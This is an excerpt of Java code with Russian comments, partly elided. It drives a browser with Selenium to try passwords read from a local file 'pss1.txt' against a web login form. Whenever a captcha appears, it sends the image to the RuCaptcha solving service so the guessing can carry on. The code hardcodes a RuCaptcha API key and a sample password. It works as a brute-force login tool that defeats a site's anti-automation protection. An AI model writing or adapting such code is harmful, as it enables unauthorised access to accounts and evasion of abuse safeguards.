...
public class Main {
    ...
    private static String PATH_TO_DESKTOP = "C:\\Users\\b.admin\\Desktop\\";
    ...
    public static boolean checkCapcha(WebDriver driver) throws Exception { // чекаем наличие капчи в error месседже
        try{
            WebElement capcha = (new WebDriverWait(driver, 1))
    ...
    public static void capchaRecognize(WebDriver driver, WebElement capcha) throws Exception { //бомбим в рукапчу
        ...
        RuCaptcha.API_KEY = "22bfd88f6d35319287cf6c573a9c0423";
        String CAPCHA_ID;
        String decryption;
        ...
        if (response.startsWith("OK")) { //если все капча -> рукапча без проблем
            ...
            while (true){
                ...
                if(response.equals(RuCaptcha.Responses.CAPCHA_NOT_READY.toString())){ //если капча еще не разгаданна
                    Thread.sleep(5000); //уходим в сон
                    ...
                    tryEnterRecognizedCapcha(driver, "234rf34", response);
    ...
    public static boolean tryEnterRecognizedCapcha(WebDriver driver, String pass, String recognizedCapcha){
        try{
            WebElement passInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
    ...
    public static void main(String[] args) throws Exception {
        ...
        Files.lines(Paths.get(PATH_TO_DESKTOP + "pss1.txt"), StandardCharsets.UTF_8).forEach(passwordFromFile::add);
